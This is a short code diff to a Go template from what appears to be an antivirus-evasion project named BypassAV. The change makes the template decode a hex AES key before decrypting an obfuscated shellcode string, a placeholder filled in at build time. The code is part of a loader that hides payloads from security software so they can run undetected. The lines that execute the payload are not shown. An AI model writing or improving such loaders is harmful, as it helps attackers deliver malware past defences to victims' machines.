@@ -3,13 +3,14 @@ package main
 import (
 	"BypassAV/In/encrypt"
 	"golang.org/x/sys/windows"
+	"encoding/hex"
 	"strconv"
 	"unsafe"
 )
 var (
-	aeskey = []byte("{{.AesKey}}")
-	sc  = "{{.Exshell}}"
-	Kmode = "{{.Keymode}}"
+        aeskey = "{{.AesKey}}"
+        sc  = "{{.Exshell}}"
+        Kmode = "{{.Keymode}}"
 )
 
 func main() {
@@ -40,10 +41,10 @@ func main() {
 
 func sdec(src string)[]byte{
 	i,_ := strconv.Atoi(Kmode)
+	skey, _ := hex.DecodeString(aeskey)
 	aes:= encrypt.NewAES() // 默认是Cbc 模式
 	aes.SetMode(i)
 	bsrc :=encrypt.Bagua_de(src)
-	shell := encrypt.Aes_de(bsrc,aeskey,aes)
+	shell := encrypt.Aes_de(bsrc,skey,aes)
 	return shell
-
 }
